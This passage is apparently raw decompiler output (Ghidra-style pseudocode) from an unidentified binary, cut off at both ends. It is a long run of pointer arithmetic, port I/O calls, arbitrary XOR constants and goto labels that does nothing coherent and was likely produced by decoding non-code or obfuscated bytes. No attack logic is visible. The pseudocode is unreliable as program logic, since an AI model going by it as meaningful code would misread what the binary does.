(uVar7 & 0xf) | uVar6;\n                            puVar36 = *(uVar50 - 0x16);\n                            pcVar15 = (uVar17 | CONCAT11((uVar38 >> 8) + uVar6, uVar7 + uVar6 * '\\x06') & 0xff0f) ^\n                                      *(uStack141 + 0x49);\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(uStack141 + 0x2f) = *(uStack141 + 0x2f) & pcVar15;\n                            pcVar15 = pcVar15 + -*(puVar26 + 3);\n                            uVar132 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *(uVar50 - 0x16) = pcVar15;\n                            *(uVar50 - 0x1a) = iVar115;\n                            *(uVar50 - 0x1e) = iVar115;\n                            *(uStack141 + 0x49) = *(uStack141 + 0x49) ^ puVar36;\n                            pcVar18 = pcVar15 & 0xffffff00 | uVar132 ^ *puVar36;\n                            *pcVar18 = *pcVar18 + (uVar132 ^ *puVar36);\n                            *puVar16 = *puVar16 + pcVar45;\n                            *(uVar50 - 0x22) = puVar26;\n                            pcVar15 = pcVar18 ^ 0x1741202e;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(uVar50 - 0x26) = iVar115;\n                            *(uVar50 - 0x2a) = puVar36;\n                            uVar122 = uStack141 - 2;\n                            *(uVar50 - 0x2e) = iVar115;\n                            pcVar18 = pcVar18 ^ 0x5806141a;\n                            *(uVar50 - 0x32) = puVar36;\n                            *pcVar18 = *pcVar18 + pcVar18;\n                            *(uStack141 + 0x3a) = *(uStack141 + 0x3a) + (uVar122 >> 8);\n                            pcVar15 = pcVar18 & 0x3f220c57;\n                            *puVar16 = *puVar16 + (puVar36 >> 8);\n                            *(uVar50 - 0x36) = uVar122;\n                            *puVar16 = *puVar16 + uVar8;\n                            uVar38 = uVar122 & 0xffffff00 | uVar122 | *((uVar50 - 0x32) + uVar122);\n                            uVar132 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            iVar37 = *(uVar50 - 0x32);\n                            uVar122 = *(pcVar15 + 0x54);\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *(uVar50 - 0x32) = in_CS;\n                            *(uVar50 - 0x36) = iVar37;\n                            iVar23 = -*(uVar38 - 1);\n                            puVar16 = *ppuVar43;\n                            *ppuVar43 = *ppuVar43 + -((uVar50 - 0x36) + iVar23);\n                            if ((uVar50 - 0x36) + iVar23 <= puVar16 && *ppuVar43 != NULL) {\n                                pcVar15[0x20] = pcVar15[0x20] & uVar132;\n                                *(iVar37 + 0x37) = *(iVar37 + 0x37) + uVar132;\n                                ppuVar43 = ppuVar116;\n                            }\n                            *(uVar50 + iVar23 + -0x3a) = iVar115 + -1;\n                            *(uVar50 + iVar23 + -0x3e) = puVar26;\n                            uVar122 = (uVar27 ^ uVar122) - 1;\n                            puVar16 = iVar115 + 0x1e;\n                            uVar7 = *puVar16;\n                            uVar8 = pcVar15 >> 8;\n                            *puVar16 = *puVar16 + uVar8;\n                            uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                            uVar132 = uVar132 + uVar6 * '\\x06';\n                            puVar19 = pcVar18 & 0x3f220c00 |\n                                      uVar132 + (0x90 < (uVar132 & 0xf0) |\n                                                CARRY1(uVar7, uVar8) | uVar6 * (0xf9 < uVar132)) * '`';\n                            uVar17 = uVar122 & 0xffff0000 | CONCAT11(uVar122 >> 8 & *ppuVar43, uVar122);\n                            *(uVar50 + iVar23 + -0x42) = ppuVar43;\n                            uVar122 = (puVar19 ^ *puVar19) + 0x5d52272d;\n                            ppuVar113 = ppuVar43 + 1;\n                            puVar16 = in(iVar37);\n                            *ppuVar43 = puVar16;\n                            cVar49 = uVar122 >> 8;\n                            *puVar26 = *puVar26 + cVar49;\n                            uVar132 = uVar122;\n                            *(ppuVar43 + 0x14) = *(ppuVar43 + 0x14) + uVar132;\n                            *(uVar50 + iVar23 + -0x47) = uVar17;\n                            uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                            uVar11 = CONCAT11(cVar49 + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                            pcVar15 = uVar122 & 0xffff0000 | uVar11;\n                            uVar122 = *(iVar115 + 0x43);\n                            *pcVar15 = *pcVar15 + uVar11;\n                            *(uVar50 + iVar23 + -0x4b) = (uVar17 ^ uVar122) - 2;\n                            *(uVar50 + iVar23 + -0x4f) = iVar115;\n                            puVar19 = (pcVar15 | 0x51512611) & 0x6f25 ^ 0x5a;\n                            pcVar18 = *(uVar50 + iVar23 + -0x4f);\n                            uVar122 = puVar19 ^ *puVar19;\n                            cVar49 = uVar122;\n                            *0x55522b38 = *0x55522b38 + cVar49;\n                            uVar7 = cVar49 - 0x31;\n                            pcVar15 = uVar122 & 0xffffff00 | uVar7;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            pcVar18[0x57] = pcVar18[0x57] + uVar7;\n                            puVar16 = *(uVar50 + iVar23 + -0x4d);\n                            *(uVar50 + iVar23 + -0x4d) = iVar115;\n                            uVar8 = puVar16;\n                            *puVar16 = *puVar16 + uVar8;\n                            uVar132 = *puVar16;\n                            *puVar16 = *puVar16 + uVar8;\n                            *pcVar18 = (*pcVar18 - (iVar37 + -1 >> 8)) - CARRY1(uVar132, uVar8);\n                            puVar36 = uVar38 - 2 & *(iVar37 + 0x39);\n                            uVar122 = *(puVar36 + iVar115 * 2 + 0x60);\n                            uVar51 = (uVar50 + iVar23) - 0x4d & *puVar26;\n                            *puVar16 = *puVar16 + uVar8;\n                            *puVar16 = *puVar16 + uVar8;\n                            uVar8 = uVar8 ^ *(puVar26 + 0x42);\n                            pcVar15 = puVar16 & 0xffffff00 | uVar8;\n                            *(uVar51 - 4) = puVar26;\n                            uVar38 = *(uVar51 - 4) + 1;\n                            *(uVar51 - 4) = uVar38;\n                            *pcVar15 = *pcVar15 + uVar8;\n                            *pcVar15 = *pcVar15 + uVar8;\n                            *(uVar51 - 8) = uVar38;\n                            *(iVar115 + 0x62) = *(iVar115 + 0x62) - (pcVar18 & uVar122);\n                            uVar132 = *puVar36;\n                            puVar19 = *(uVar51 - 8);\n                            ppcVar119 = puVar26 + 2;\n                            *puVar19 = *puVar19 ^ puVar19;\n                            *puVar19 = *puVar19 + puVar36;\n                            uVar128 = *(uVar51 - 5);\n                            iVar52 = *(uVar51 - 1);\n                            uVar8 = puVar19 - 4;\n                            pcVar15 = puVar19 & 0xffffff00 | uVar8;\n                            *pcVar15 = *pcVar15 + uVar8;\n                            pcVar15 = iVar115 + 0x36 + pcVar15 * 2;\n                            *pcVar15 = *pcVar15 + uVar8;\n                            pcVar18 = puVar26 + 1;\n                            puVar53 = iVar52 + 3;\n                            *(iVar52 + -1) = puVar36;\n                            puVar16 = (uVar38 & 0xffff0000 | CONCAT11(uVar38 >> 8 ^ uVar132, uVar38)) + 1;\n                            pcVar15 = *(iVar52 + -1);\n                            uVar132 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            pcVar15[0x2d] = pcVar15[0x2d] + (puVar16 >> 8);\n                            uVar6 = 9 < (uVar132 & 0xf) | 9 < (uVar8 & 0xf) | 9 < (uVar7 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((pcVar15 >> 8) - uVar6, uVar132 + uVar6 * -6) & 0xff0f;\n                            uVar132 = uVar11;\n                            uVar6 = 9 < uVar132 | uVar6;\n                            uVar11 = CONCAT11((uVar11 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                            uVar132 = *puVar16;\n                            uVar7 = uVar11 >> 8;\n                            if (uVar7 == *puVar16) {\n                                *(iVar52 + -1) = iVar115 + 1;\n                                puVar53 = iVar52 + -5;\n                                *(iVar52 + -5) = iVar52 + -1;\n                            }\n                            iVar54 = *puVar53;\n                            uVar6 = 9 < uVar11 | uVar6;\n                            uVar8 = uVar11 + uVar6 * '\\x06';\n                            uVar8 = uVar8 + (0x90 < (uVar8 & 0xf0) | uVar7 < uVar132 | uVar6 * (0xf9 < uVar8)) * '`';\n                            pcVar15 = pcVar15 & 0xffff0000 | uVar11 & 0xffffff00 | uVar8;\n                            *(ppuVar43 + 0x1a) = *(ppuVar43 + 0x1a) ^ pcVar18;\n                            *pcVar15 = *pcVar15 + uVar8;\n                            *pcVar15 = *pcVar15 + uVar8;\n                            pcVar15 = *(iVar54 + 4);\n                            *(iVar54 + 4) = puVar36;\n                            *(iVar54 + -1) = iVar54 + 3;\n                            *(iVar54 + -5) = pcVar18;\n                            uVar38 = puVar16 ^ *(iVar115 + 0x55);\n                            *(iVar54 + -9) = ppuVar113;\n                            uVar122 = *(iVar54 + -9);\n                            *(iVar54 + -9) = pcVar18;\n                            *(iVar54 + -0xd) = uVar38;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *ppuVar113 = *ppuVar113 | pcVar15;\n                            pcVar15 = (pcVar15 ^ 0x19382328) + 0xd8d2a1d8;\n                            puVar46 = puVar36 + 1;\n                            *ppuVar113 = *ppuVar113 ^ uVar122;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(iVar115 + 0x46) = *(iVar115 + 0x46) + uVar38;\n                            *(iVar54 + -0x11) = uVar38;\n                            *(iVar54 + -0x15) = puVar46;\n                            *(iVar54 + -0x19) = pcVar18;\n                            *(iVar54 + -0x1d) = pcVar18;\n                            uVar17 = iVar115 + 2;\n                            puVar16 = uVar122 - 1;\n                            uVar132 = pcVar15 ^ *(uVar122 + 0x41);\n                            uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((pcVar15 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                            pcVar18 = pcVar15 & 0xffff0000 | uVar11;\n                            uVar8 = *(iVar54 + -0x1d) + 1;\n                            *(iVar54 + -0x1d) = puVar46;\n                            uVar7 = uVar11;\n                            *pcVar18 = *pcVar18 + uVar7;\n                            uVar132 = *puVar16;\n                            *puVar16 = *puVar16 + uVar8;\n                            ppuVar55 = *(iVar54 + -0x1d);\n                            uVar6 = 9 < uVar7 | uVar6;\n                            uVar7 = uVar7 + uVar6 * -6;\n                            pcVar15 = (pcVar15 & 0xffff0000 | uVar11 & 0xffffff00 |\n                                      uVar7 + (0x9f < uVar7 | CARRY1(uVar132, uVar8) | uVar6 * (uVar7 < 6)) * -0x60) +\n                                      0xe886dadb;\n                            uVar122 = ppuVar55[1];\n                            uVar34 = uVar122;\n                            uVar122 = uVar122 & 0xffff0000 | CONCAT11(uVar122 >> 8 & *puVar46, uVar34);\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            ppuVar55[1] = puVar46;\n                            ppuVar55[1] = ppuVar55 + 2;\n                            puVar46 = pcVar15 ^ 0x4c421a12;\n                            uVar132 = *puVar46;\n                            uVar10 = puVar46;\n                            *puVar46 = *puVar46 + uVar10;\n                            puVar16 = uVar122 + 0x25;\n                            uVar8 = *puVar16;\n                            uVar7 = *puVar16;\n                            *puVar16 = (uVar7 - uVar34) - CARRY1(uVar132, uVar10);\n                            uVar6 = 9 < (uVar10 & 0xf) | uVar6;\n                            uVar9 = uVar10 + uVar6 * '\\x06';\n                            pcVar15 = (puVar46 & 0xffffff00 |\n                                      uVar9 + (0x90 < (uVar9 & 0xf0) |\n                                              (uVar8 < uVar34 || uVar7 - uVar34 < CARRY1(uVar132, uVar10)) |\n                                              uVar6 * (0xf9 < uVar9)) * '`') ^ 0x49772b53;\n                            uVar132 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *ppuVar55 = uVar122;\n                            uVar6 = 9 < ((uVar132 ^ 0x4c) & 0xf) | uVar6;\n                            uVar11 = CONCAT11((pcVar15 >> 8) + uVar6, (uVar132 ^ 0x4c) + uVar6 * '\\x06') & 0xff0f;\n                            uVar39 = ppuVar55[2];\n                            uVar132 = uVar11;\n                            uVar6 = 9 < uVar132 | uVar6;\n                            uVar11 = CONCAT11((uVar11 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                            pcVar18 = pcVar15 & 0xffff0000 | uVar11;\n                            cVar49 = uVar11;\n                            *pcVar18 = *pcVar18 + cVar49;\n                            *pcVar18 = *pcVar18 + cVar49;\n                            uVar38 = puVar36 & *(puVar26 + 0x39);\n                            ppcVar30 = *ppcVar119;\n                            *ppcVar119 = *ppcVar119 + -ppcVar119;\n                            *(ppuVar55 + 7) = uVar17;\n                            uVar122 = (pcVar15 & 0xffff0000 | uVar11 & 0xffffff00 |\n                                      (cVar49 - *(iVar115 + 0x4e)) - (ppcVar30 < ppcVar119)) ^ 0x33543740;\n                            puVar16 = ppuVar43 + 7;\n                            uVar1 = in(uVar39);\n                            *(ppuVar43 + 6) = uVar1;\n                            pcVar15 = (uVar122 & 0xffff0000 | CONCAT11(uVar122 >> 8 & *ppcVar119, uVar122)) + 0x37;\n                            *pcVar15 = *pcVar15 + *(ppuVar55 + 0xb);\n                            uVar39 = *(ppuVar55 + 0x13);\n                            uVar122 = *(ppuVar55 + 0x17);\n                            *puVar16 = *puVar16 ^ uVar122 >> 8;\n                            *(ppuVar55 + 0x17) = ppcVar119;\n                            uVar122 = uVar122 ^ puVar26[0x11];\n                            *(ppuVar55 + 0x13) = uVar17;\n                            *ppcVar119 = *ppcVar119 | uVar39 >> 8;\n                            *puVar16 = *puVar16 - (uVar122 >> 8);\n                            puVar47 = uVar38 & 0xffff0000 | CONCAT11((uVar38 >> 8) + puVar16[ppcVar119], uVar38);\n                            puVar19 = *(ppuVar55 + 0x13);\n                            puVar120 = puVar26 + 1;\n                            ppuVar55[7] = puVar47;\n                            puVar28 = *(ppuVar55 + 0x1b) + 1;\n                            ppuVar56 = ppuVar55 + 6;\n                            ppuVar55[6] = puVar19;\n                            *(puVar19 + 0x29) = *(puVar19 + 0x29) + uVar38;\n                            puVar16 = ppuVar43 + 2 ^ *0x3c202f3e;\n                            if (puVar19 + -0x22 < '\\0') {\ncode_r0x00441a72:\n                                in_DS = *ppuVar56;\n                                *puVar19 = *puVar19 & uVar17;\n                                uVar57 = ppuVar56 + 4 & *puVar47;\n                                ppuVar58 = uVar57 - 1;\n                                if (uVar57 < 1) {\n                                    ppuVar58 = uVar57 - 5;\n                                    *(uVar57 - 5) = puVar120;\n                                    puVar47 = puVar47 + 1;\n                                }\n                            }\n                            else {\n                                pcVar15 = puVar19 & 0x34000057;\n                                ppuVar55[5] = ppuVar55 + 6;\n                                ppuVar55[4] = ppuVar55 + 5;\n                                ppuVar55[3] = pcVar15;\n                                iVar23 = ppuVar55[3];\n                                ppuVar55[3] = puVar47;\n                                uVar122 = ppuVar55[3];\n                                ppuVar55[3] = uVar122;\n                                ppuVar55[2] = puVar26 + 1;\n                                uVar132 = pcVar15;\n                                *(uVar122 + 0x31) = *(uVar122 + 0x31) ^ uVar132;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                                uVar38 = puVar19 & 0x34000000;\n                                uVar11 = CONCAT11(-uVar6, uVar132 + uVar6 * -6) & 0xff0f;\n                                uVar132 = uVar11 - 0x30;\n                                uVar27 = uVar11 & 0xffffff00;\n                                puVar19 = uVar38 | uVar27 | uVar132;\n                                puVar28 = uVar122 ^ *(iVar23 + 0x2b);\n                                ppuVar58 = ppuVar55 + 1;\n                                ppuVar55[1] = uVar17;\n                                puVar47 = puVar47 & *(puVar47 + 0x32);\n                                puVar120 = puVar26 + 1 & *puVar47;\n                                uVar122 = iVar23 - 1;\n                                if (0 < iVar23) {\n                                    *ppuVar55 = puVar47;\n                                    uVar7 = *puVar19;\n                                    *(puVar47 + 0x45) = *(puVar47 + 0x45) + uVar122;\n                                    ppuVar55[-1] = uVar122;\n                                    *(ppuVar55 + -7) = uVar122;\n                                    uVar6 = 9 < (uVar132 & uVar7 & 0xf) | uVar6;\n                                    uVar11 = CONCAT11((uVar27 >> 8) + uVar6, (uVar132 & uVar7) + uVar6 * '\\x06') &\n                                             0xff0f;\n                                    ppuVar55[-3] = puVar120;\n                                    puVar120 = puVar120 + 1;\n                                    uVar132 = uVar11;\n                                    uVar6 = 9 < uVar132 | uVar6;\n                                    uVar132 = uVar132 + uVar6 * '\\x06';\n                                    uVar11 = CONCAT11((uVar11 >> 8) + uVar6, uVar132) & 0xff0f;\n                                    pcVar15 = uVar38 | uVar11;\n                                    ppuVar56 = ppuVar55 + -0xb;\n                                    *pcVar15 = *pcVar15 + uVar11;\n                                    puVar19 = uVar38 | (uVar132 & 0xf | (uVar11 >> 8 | *0x21212a36) << 8);\n                                    *(ppuVar55 + -0xf) = uVar128;\n                                    puVar28 = *(ppuVar55 + -0xf);\n                                    puVar47 = puVar47 & 0xffff0000 | CONCAT11((puVar47 >> 8) - *puVar120, puVar47);\n                                    goto code_r0x00441a72;\n                                }\n                                *puVar19 = *puVar19 + uVar132;\n                            }\n                            *puVar16 = *puVar16 & puVar19 >> 8;\n                            *puVar19 = *puVar19 + puVar19;\n                            *puVar19 = *puVar19 + puVar19;\n                            *(ppuVar58 + -5) = puVar16;\n                            uVar38 = *(ppuVar58 + -4);\n                            *(ppuVar58 + -4) = puVar47;\n                            *(ppuVar58 + -8) = uVar38;\n                            *(ppuVar58 + -0xc) = puVar16 + -1;\n                            iVar23 = iVar115 + 2;\n                            *(ppuVar58 + -0x10) = puVar28;\n                            pcVar15 = uVar38 ^ 0x43563256;\n                            puVar59 = ppuVar58 + -0x14;\n                            *(ppuVar58 + -0x14) = pcVar15;\n                            uVar132 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *puVar47 = *puVar47 | puVar28 >> 8;\n                            puVar36 = iVar115 + 0x26 + puVar47 * 2;\n                            *puVar36 = *puVar36 & uVar122;\n                            if (*puVar36 == 0) {\n                                *(ppuVar58 + -0x18) = iVar23;\n                                puVar26 = uVar38 ^ 0x43563204;\n                                in_DS = *(ppuVar58 + -0x18);\n                            }\n                            else {\n                                uVar122 = uVar122 & 0xffffff00 | uVar122 & *(uVar122 + 0x2c);\n                                *(ppuVar58 + -0x18) = puVar120;\n                                iVar37 = -*(puVar28 + iVar23);\n                                *(ppuVar58 + iVar37 + -0x1c) = iVar23;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                puVar19 = uVar122 + 1;\n                                puVar28 = puVar28 + 1;\n                                puVar47 = puVar47 + 1;\n                                uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                                pcVar15 = (pcVar15 & 0xffff0000 |\n                                          CONCAT11((pcVar15 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f) ^\n                                          0x3176791e;\n                                *pcVar15 = *pcVar15 + pcVar15;\n                                *puVar28 = *puVar28 + (puVar47 >> 8);\n                                puVar26 = *(ppuVar58 + iVar37 + -0x1d);\n                                puVar120 = *(ppuVar58 + iVar37 + -0x19);\n                                puVar59 = ppuVar58 + iVar37 + -0x15;\n                                if (-1 < (pcVar15 >> 8 & *puVar19)) {\n                                    *puVar19 = *puVar19 & puVar19;\n                                    *(uVar122 + 0x4e) = *(uVar122 + 0x4e) + puVar47;\n                                    puVar59 = ppuVar58 + iVar37 + -0x12;\n                                    *puVar28 = *puVar28 ^ puVar16 + -3;\n                                    *(ppuVar58 + iVar37 + -0x16) = puVar19;\n                                    puVar26 = *(ppuVar58 + iVar37 + -0x16);\n                                    *puVar47 = *puVar47 + (puVar26 >> 8);\n                                    uVar122 = puVar19 & 0xffffff00 | puVar19 ^ *(iVar115 + 0x59);\n                                    iVar23 = iVar115 + 3;\n                                }\n                            }\n                            cVar49 = puVar26;\n                            *puVar26 = *puVar26 + cVar49;\n                            *(puVar59 + -4) = puVar26;\n                            piVar123 = puVar16 + -3 ^ *puVar26;\n                            *(puVar59 + -8) = piVar123;\n                            *puVar26 = *puVar26 + cVar49;\n                            *piVar123 = *piVar123 + uVar122;\n                            *piVar123 = *piVar123 & puVar28 + 1 >> 8;\n                            *0x3a413462 = *0x3a413462 - puVar120;\n                            *puVar26 = *puVar26 + cVar49;\n                            puVar59[uVar122 * 2 + 0x42] = puVar59[uVar122 * 2 + 0x42] + cVar49;\n                            pcVar15 = *(puVar59 + -8);\n                            uVar7 = uVar122 ^ *(iVar23 + 0x35);\n                            puVar16 = uVar122 & 0xffffff00 | uVar7;\n                            *(puVar59 + -8) = puVar16;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *piVar123 = *piVar123 + puVar47;\n                            *piVar123 = *piVar123 - piVar123;\n                            *(puVar120 + 0x3a) = *(puVar120 + 0x3a) & uVar7;\n                            *puVar16 = *puVar16 & puVar28 + 1;\n                            pcVar15[0x2f] = pcVar15[0x2f] - puVar47;\n                            pcVar15 = pcVar15 & 0x36601d56;\n                            uVar132 = *piVar123;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            iVar37 = *(puVar59 + -5);\n                            *(puVar59 + -5) = puVar120 + 1;\n                            pcVar15 = pcVar15 + -1 ^ *(iVar37 + 0x33);\n                            uVar122 = (uVar122 & 0xffff0000 | CONCAT11((uVar122 & 0xffffff00) >> 8 & uVar132, uVar7)) +\n                                      1;\n                            puVar124 = piVar123 + 1;\n                            *(puVar59 + -9) = puVar120;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            puVar16 = puVar47 + 0x73;\n                            uVar132 = *puVar16;\n                            uVar7 = uVar122 >> 8;\n                            *puVar16 = *puVar16 + uVar7;\n                            *puVar124 = (*puVar124 - iVar37) - CARRY1(uVar132, uVar7);\n                            iVar115 = *(puVar59 + -1);\n                            iVar60 = *(puVar59 + 3);\n                            uVar7 = uVar122 - *0x30000000;\n                            puVar16 = iVar115 + -1;\n                            *(iVar60 + 1) = puVar16;\n                            uVar11 = CONCAT11((uVar122 & 0xffffff00) >> 8 ^ *(uVar122 & 0xffffff00 | uVar7), uVar7);\n                            puVar19 = (pcVar15 & 0xffffff00 | pcVar15 - 0x40) ^ 0x59374338;\n                            cVar49 = puVar19;\n                            *puVar19 = *puVar19 + cVar49;\n                            *puVar19 = *puVar19 + cVar49;\n                            uVar132 = *puVar16;\n                            *(iVar60 + -3) = 0x33573b15;\n                            puVar26 = (iVar37 - 2U & 0xffffff00 | iVar37 - 2U | uVar132) + 0x2a;\n                            *puVar26 = *puVar26 & puVar19;\n                            uVar39 = in(uVar11);\n                            *puVar124 = uVar39;\n                            *puVar19 = *puVar19 + cVar49;\n                            *puVar19 = *puVar19 + cVar49;\n                            *(piVar123 + 0x39) = *(piVar123 + 0x39) ^ uVar7;\n                            pcVar15 = (uVar122 & 0xffff0000 | uVar11) + 1;\n                            *(iVar60 + -7) = pcVar15;\n                            uVar122 = *(iVar60 + -7);\n                            *puVar19 = *puVar19 ^ puVar19;\n                            *puVar19 = *puVar19 + cVar49;\n                            *puVar19 = *puVar19 + pcVar15;\n                            *(iVar60 + -7) = in_CS;\n                            puVar124 = *(iVar60 + -3);\n                            *pcVar15 = *pcVar15 - (puVar19 >> 8);\n                            uVar38 = iVar115 - 1;\n                            *(iVar60 + -3) = uVar38;\n                            *(iVar60 + -7) = pcVar15;\n                            puVar26 = iVar23 + 0x59 + uVar122 * 2;\n                            *puVar26 = *puVar26 ^ uVar122;\n                            puVar26 = puVar120 + -1;\n                            puVar16 = iVar23 + 3 + (puVar124 + -1) * 2;\n                            uVar7 = *puVar16;\n                            uVar8 = uVar38 >> 8;\n                            uVar132 = *puVar16;\n                            *puVar16 = *puVar16 + uVar8;\n                            if (!SCARRY1(uVar132, uVar8)) {\n                                pcVar15 = pcVar15 + CARRY1(uVar7, uVar8) + *(pcVar15 + puVar124 + -1);\n                            }\n                            uVar27 = *(iVar60 + -7);\n                            *puVar124 = *puVar124 ^ pcVar15 >> 8;\n                            iVar37 = *(iVar60 + -3);\n                            uVar17 = iVar23 - 1;\n                            uVar118 = uVar27 ^ 0x5a514100;\n                            uVar38 = uVar38 ^ *(uVar118 + 0x55);\n                            *(iVar60 + -3) = iVar37;\n                            pcVar15 = puVar120 + 0x6e;\n                            *pcVar15 = *pcVar15 + (uVar38 >> 8);\n                            if (*pcVar15 == '\\0') {\n                                *(iVar23 + 0x6f) = *(iVar23 + 0x6f) | uVar27 >> 8 ^ 0x41;\n                                *0xb120f10 = *0xb120f10 | uVar122;\n                                uVar39 = in(iVar37);\n                                *puVar124 = uVar39;\n                                out(*puVar26, iVar37);\n                                puVar26 = puVar120;\n                                puVar124 = puVar124 + 1;\n                            }\n                            else {\n                                uVar17 = uVar17 | *(iVar23 + 0x6d);\n                            }\n                            pcVar15 = iVar37 + 0x31 + uVar122 * 2;\n                            *pcVar15 = *pcVar15 + iVar37;\n                            iVar23 = *(iVar60 + -3);\n                            uVar122 = uVar122 + 1;\n                            puVar114 = puVar26 ^ *0x57594b57;\n                            *(iVar60 + -3) = puVar124;\n                            puVar26 = uVar118 - 1;\n                            puVar16 = uVar118 + 0x62;\n                            uVar132 = *puVar16;\n                            uVar7 = iVar23 >> 8;\n                            *puVar16 = *puVar16 + uVar7;\n                            if (CARRY1(uVar132, uVar7)) {\n                                uVar128 = *(iVar60 + -2);\n                                puVar62 = iVar60 + 2;\n                                piVar123 = iVar60 + 2;\n                                puVar16 = uVar118 + 0x7b09031c;\n                                if (puVar16 != NULL) goto code_r0x00441c00;\ncode_r0x00441c06:\n                                piVar61 = piVar123 + 1;\n                                uVar38 = uVar38 + 1;\n                                uVar17 = uVar17 + 1;\n                                iVar23 = iVar23 + 1;\n                                puVar16 = *piVar123 + -1;\n                            }\n                            else {\n                                uVar27 = uVar122 + *puVar26;\n                                uVar122 = uVar27 & 0xffff0000 |\n                                          CONCAT11(((uVar27 >> 8) - *(uVar27 + 0x6c)) - CARRY4(uVar122, *puVar26), \n                                                   uVar27);\n                                *puVar26 = *puVar26 + puVar26;\n                                iVar23 = *(iVar60 + -2);\n                                puVar16 = *(iVar60 + 2);\n                                piVar61 = iVar60 + 5;\n                                puVar114 = puVar114 + 3;\n                                bVar131 = CARRY1(*puVar16, puVar16);\n                                *puVar16 = *puVar16 + puVar16;\n                                if (bVar131 || *puVar16 == 0) {\n                                    *(iVar60 + 1) = 0xb;\n                                    *(iVar60 + -3) = puVar16;\n                                    *(iVar60 + -7) = uVar122;\n                                    *(iVar60 + -0xb) = iVar23;\n                                    *(iVar60 + -0xf) = uVar38;\n                                    *(iVar60 + -0x13) = iVar60 + 1;\n                                    *(iVar60 + -0x17) = uVar17;\n                                    *(iVar60 + -0x1b) = puVar114;\n                                    *(iVar60 + -0x1f) = puVar124 + -1;\n                                    puVar16 = puVar16 + -0x507171c +\n                                              ((-0x747b0903 - bVar131) -\n                                              (puVar16 < 0x507171c || puVar16 + -0x507171c < bVar131));\n                                    puVar62 = iVar60 + -0x23;\n                                    *(iVar60 + -0x23) = uVar128;\ncode_r0x00441c00:\n                                    pcVar15 = segment(in_DS, uVar38 + puVar114);\n                                    *pcVar15 = *pcVar15 + puVar16;\n                                    *(iVar23 + 0x58) = *(iVar23 + 0x58) + iVar23;\n                                    piVar123 = puVar62;\n                                    goto code_r0x00441c06;\n                                }\n                            }\n                            *(piVar61 + -4) = iVar23;\n                            *(piVar61 + -8) = uVar17;\n                            puVar16 = puVar16 + -1;\n                            uVar118 = uVar38 + 1;\n                            piVar123 = iVar23 + 1;\n                            *puVar16 = *puVar16 + puVar16;\n                            *(uVar17 + 0x71) = *(uVar17 + 0x71) + (uVar118 >> 8);\n                            uVar7 = puVar16 | *piVar123;\n                            pcVar15 = puVar16 & 0xffffff00 | uVar7;\n                            puVar16 = piVar61 + uVar17 * 2 + -8;\n                            uVar132 = *puVar16;\n                            *puVar16 = *puVar16 + uVar122;\n                            uVar27 = CARRY1(uVar132, uVar122);\n                            iVar37 = *piVar123;\n                            iVar23 = *piVar123;\n                            uVar29 = uVar122 + iVar23 + uVar27;\n                            *(piVar61 + -0xc) = in_DS;\n                            puVar126 = piVar61 + -0xc;\n                            if (SCARRY4(uVar122, iVar37) != SCARRY4(uVar122 + iVar23, uVar27)) {\n                                out(*puVar114, piVar123);\n                                *pcVar15 = *pcVar15 + uVar7;\n                                pcVar15[0x35] = pcVar15[0x35] + uVar118;\n                                uVar29 = uVar29 - 1;\n                                piVar123 = piVar123 ^ *(uVar17 + 0x43);\n                                puVar114 = puVar114 + 3;\n                                pcVar15 = *(piVar61 + -0xc) ^ 0x54;\n                                uVar118 = uVar38;\n                                puVar126 = piVar61 + -8;\n                            }\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            puVar16 = pcVar15 + 0x6a;\n                            uVar132 = *puVar16;\n                            uVar7 = pcVar15 >> 8;\n                            *puVar16 = *puVar16 + uVar7;\n                            pcVar15 = pcVar15 + (-0x1f0d161b - CARRY1(uVar132, uVar7));\n                            uVar39 = in(piVar123);\n                            *(puVar124 + -1) = uVar39;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            *(puVar126 + -4) = uVar118 - 1;\n                            puVar46 = pcVar15 + -1;\n                            uVar7 = puVar46;\n                            *puVar46 = *puVar46 + uVar7;\n                            uVar132 = *puVar46;\n                            *puVar46 = *puVar46 + uVar7;\n                            puVar19 = puVar124 + 1;\n                            uVar1 = in(piVar123);\n                            *(puVar124 + 3) = uVar1;\n                            *puVar19 = (*puVar19 - piVar123) - CARRY1(uVar132, uVar7);\n                            puVar26 = (uVar118 - 1) + piVar123;\n                            *puVar26 = *puVar26 | uVar29;\n                            uVar129 = *(puVar126 + 